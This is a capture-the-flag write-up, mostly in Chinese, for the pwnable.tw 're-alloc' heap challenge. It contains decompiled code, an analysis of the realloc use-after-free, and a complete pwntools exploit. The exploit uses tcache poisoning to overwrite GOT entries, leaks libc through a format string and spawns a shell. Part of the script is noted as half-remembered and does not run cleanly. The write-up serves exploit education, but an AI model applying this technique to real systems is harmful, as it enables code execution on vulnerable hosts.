# realloc

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

FORTIFY 在 buffer 大小已知，GCC 會把 strcpy、memcpy,、memset等函數替換成相應的 strcpy_chk(dst, src, dstlen)等函數，達到防止 overflow

gcc 預設開啟，但是要在 O1 以上才會真正開啟

>glibc 2.29 這版有 tcache 並會檢查 double free
>並且結構中多了key
>當chunk被free到tcache中時，key會被置為第一個chunk的地址
>通過key來確認chunk是否在tcache中
>將一個chunk放入tcache時，會檢查該chunk的key是否等於tcache結構體的地址，如果是，則進一步檢查tcache中是否已有地址相同的chunk，從而觸發double free的檢查機制

>void *realloc(void *ptr, size_t size);

case
- realloc(0,512) = malloc (512)
- realloc(ptr,0) = free(ptr)
- realloc(ptr,1024) = free(ptr) malloc(1024) 資料會複製到新的
- 這邊不確定 realloc 可不可以縮小空間

```c 

// read_long 只能讀 ０ 1

__int64 __fastcall read_input(__int64 a1, unsigned int a2)
{
  __int64 result; // rax

  LODWORD(result) = __read_chk(0LL, a1, a2, a2);
  if ( !(_DWORD)result )
  {
    puts("read error");
    _exit(1);
  }
  if ( *(_BYTE *)((signed int)result - 1LL + a1) == 10 )
    *(_BYTE *)((signed int)result - 1LL + a1) = 0;
  return (signed int)result;
}


int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  __int64 v3; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v5; // [rsp+18h] [rbp-8h]

  printf("Index:", 0LL, 0LL, 0LL, 0LL);
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:", v2);
    size = read_long();
    if ( size <= 0x78 )  // size 可控 為0 等同於 malloc
    {
      v5 = realloc(0LL, size);
      if ( v5 )
      {
        heap[v3] = v5;
        printf("Data:", size);
        v0 = (char *)heap[v3] + read_input(heap[v3], (unsigned int)size);
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (signed int)v0;
}

int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc(heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:", size);
  return read_input((__int64)heap[v1], size);
}

int rfree()
{
  void **v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc(heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (signed int)v0;
}
```
reallocate size 為零 free 後，沒有清空 ptr

rfree 有清空 ptr

可以利用 alloc 分配，realloc size0 free，再 realloc 寫 chunk

把 fd 寫成 atoll got，寫成 printf 的位置，用於洩漏 libc 或是任意寫

重複以下流程使 tecache 多 size 上留下 atoll_got，方便後面利用(其實好像也用不太到)



```python=
alloc(0, 0x18, "AAA") # malloc id0
realloc(0, 0, "")    # free id0
realloc(0, 0x18, p64(elf.got["atoll"])) # id0 write fd 
alloc(1, 0x18, "BBB") # malloc  id1 (with atoll got)  這塊的下一塊會被先取，也就是已經寫上 elf.got["atoll"])
# heap[0] ==> chunk(0x18) <== heap[1]


realloc(0, 0x28, "CCC") # (with atoll got)
free(0)             # free id0
realloc(1, 0x28, "s"*0x10) # get id0 and rewrite key (with atoll got)
free(1)                # free id1
# bins 0x20 => 0 -> 1 -> got  (got會被先取)

alloc(0, 0x38, "AAA")
realloc(0, 0, "")
realloc(0, 0x38, p64(elf.got["atoll"]))
alloc(1, 0x38, "BBB")
 
realloc(0, 0x48, "CCC")
free(0)
realloc(1, 0x48, "s"*0x10)
free(1)

# 直接拿到 got 位置並且寫入 printf
alloc(0, 0x38, p64(elf.plt["printf"]))
# leak stack 上 libc_start_main
free("%21$llx")

# 直接對 data 寫入 等同於修改 got ，變成 system 填入 /bin/sh
io.sendlineafter("Your choice: ", "1")
io.sendlineafter("Index:", "A\x00")       # 相当于输入1
io.sendlineafter("Size:", "%55x")         # 相当于输入0x38
io.sendlineafter("Data:", p64(system_addr))
io.sendlineafter("Your choice: ", "1")
io.sendlineafter("Index:", "/bin/sh")

```

exploit

```python=

#!/usr/bin/env python3

from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

elf = ELF("./re-alloc")
libc = ELF("./libc.so")
io = process(elf.path)
#io = remote("chall.pwnable.tw",10106)



def alloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(data)

def realloc(idx, size, data):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    if size != 0:
        io.recvuntil("Data:")
        io.send(data)

def free(idx):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(idx))

alloc(0, 0x18, "AAA")
realloc(0, 0, "")
realloc(0, 0x18, p64(elf.got["atoll"]))
alloc(1, 0x18, "BBB")

realloc(0, 0x28, "CCC")
free(0)
realloc(1, 0x28, "s"*0x10)
free(1)

'''
alloc(0, 0x38, "AAA")
realloc(0, 0, "")
realloc(0, 0x38, p64(elf.got["atoll"]))
alloc(1, 0x38, "BBB")
 
realloc(0, 0x48, "CCC")
free(0)
realloc(1, 0x48, "s"*0x10)
free(1)
'''

alloc(0, 0x38, p64(elf.plt["printf"]))
free("%21$llx")

// r ??? 忘了當初打啥
libc_start_main_ret = int(r(12), 16)
libc_base = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
system_addr = libc_base + libc.symbols["system"]
success("system address: " + hex(system_addr))


io.sendlineafter("Your choice: ", "1")
io.sendlineafter("Index:", "A\x00")
io.sendafter("Size:", "A"*15+"\x00")
io.sendafter("Data:", p64(system_addr))
free("/bin/sh\x00")

io.interactive()

```


>FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}